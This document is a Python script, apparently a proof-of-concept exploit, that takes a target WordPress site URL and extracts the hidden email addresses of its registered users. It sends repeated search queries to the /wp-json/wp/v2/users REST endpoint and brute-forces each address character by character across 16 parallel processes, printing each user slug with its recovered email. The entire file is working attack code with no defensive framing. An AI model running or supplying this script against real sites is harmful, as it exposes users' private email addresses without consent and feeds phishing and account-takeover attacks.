from multiprocessing import Pool
import requests
import string
import json
import sys


if len(sys.argv) != 2:
	print(f'USAGE: {sys.argv[0]} <target site root url>')
	sys.exit()

url = sys.argv[1].rstrip('/') + '/wp-json/wp/v2/users'

known_users = {}
user_suffixes = []
current_suffix = '@'
headers = { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136' }

def bruteforce_search(txt):
	users = json.loads(requests.get(url, headers=headers, data=json.dumps({'search':txt})).text)
	return (txt, users)



if __name__ == '__main__':
	# String comparisons in the DB are case-insensitive, so don't bother with uppercase letters
	dic = string.ascii_lowercase + string.digits + '!#$&\'+\/=?^_`{|}~\.-]+'
	p = Pool(16)

	users = json.loads(requests.get(url).text)

	# Initial round: Grab all users by their first email domain's character
	suffixes = [current_suffix + c for c in dic]

	for suffix, users in p.imap(bruteforce_search, suffixes):
		if len(users) > 0:
			print(users)
			for user in users:
				slug = user['slug']
				print(f'# Added user: {slug}, suffix: {suffix}')
				known_users[user['slug']] = suffix

	# Iterate through all users
	for user in known_users:
		print(f'# Bruteforcing email domain for {user}..')
		foundSomething = True
		while foundSomething:
			foundSomething = False
			suffixes = [known_users[user] + c for c in dic]
			for suffix, users_found in p.imap(bruteforce_search, suffixes):
				for user_found in users_found:
					if user_found['slug'] == user:
						print(suffix)
						known_users[user] = suffix
						foundSomething = True
						break

	for user in known_users:
		print(f'# Bruteforcing email ID for {user}..')
		foundSomething = True
		while foundSomething:
			foundSomething = False
			suffixes = [c + known_users[user] for c in dic]
			for suffix, users_found in p.imap(bruteforce_search, suffixes):
				for user_found in users_found:
					if user_found['slug'] == user:
						print(suffix)
						known_users[user] = suffix
						foundSomething = True
						break

	print('# Found the following:')
	for user in known_users:
		email = known_users[user]
		print(f'{user} => {email}')
